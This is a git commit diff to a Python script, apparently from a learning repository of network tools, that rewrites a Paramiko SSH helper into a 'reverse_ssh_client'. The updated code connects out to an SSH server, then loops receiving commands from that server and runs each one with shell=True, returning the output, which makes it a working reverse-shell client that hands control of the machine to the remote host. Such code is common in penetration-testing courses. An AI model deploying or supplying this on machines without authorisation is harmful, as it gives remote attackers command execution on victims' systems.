c8be7368074033b4da19d0ed9d5c82057f072343
Tinjis <thecybertrojan@gmail.com>
2025-03-13 13:52:17 +0000

    Update ssh_rcmd.py

--- Network-Tools/006 - Paramiko SSH Tools/ssh_rcmd.py
+++ Network-Tools/006 - Paramiko SSH Tools/ssh_rcmd.py
@@ -3,39 +3,50 @@ import shlex
 import subprocess
 import getpass
 
-def ssh_command(ip, port, username, password, command):
-    
+def reverse_ssh_client(ip, port, username, password, initial_command):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(ip, port=port, username=username, password=password)
-
+    
     ssh_session = client.get_transport().open_session()
     
     if ssh_session.active:
-        ssh_session.send(command)
+        ssh_session.send(initial_command.encode())
         print(ssh_session.recv(1024).decode())
+    
+    try:
+        while True:
+            ssh_session.settimeout(30)
+            command = ssh_session.recv(1024)
+            try:
+                cmd = command.decode().strip()
+                if cmd.lower() == "exit":
+                    break
 
-    while True:
-        command = ssh_session.recv(1024)
-        try:
-            cmd = command.decode()
-            if cmd == "exit":
-                client.close()
-                break
+                cmd_output = subprocess.check_output(cmd, shell=True)
+                ssh_session.send(cmd_output or b"okay")
 
-            cmd_arguments = shlex.split(cmd)
-            cmd_output = subprocess.check_output(cmd_arguments, shell=True)
-            ssh_session.send(cmd_output or "okay")
+            except Exception as e:
+                ssh_session.send(str(e).encode())
 
-        except Exception as e:
-            ssh_session.send(str(e))
-
-    client.close()
+    except KeyboardInterrupt:
+        print("Interrupted by user.")
+    finally:
+        client.close()
+        print("Connection closed.")
 
 if __name__ == "__main__":
-    user = getpass.getpass()
-    password = getpass.getpass()
-
+    username = input("Username: ")
+    password = getpass.getpass("Password: ")
     ip = input("Enter server IP: ")
-    port = input("Enter port: ")
-    ssh_command(ip, port, user, password, "ClientConnected")
+
+    while True:
+        port_input = input("Enter port: ")
+        try:
+            port = int(port_input)
+            break
+        except ValueError:
+            print("Invalid port. Enter a valid number.")
+
+    reverse_ssh_client(ip, port, username, password, "Client Connected")
+
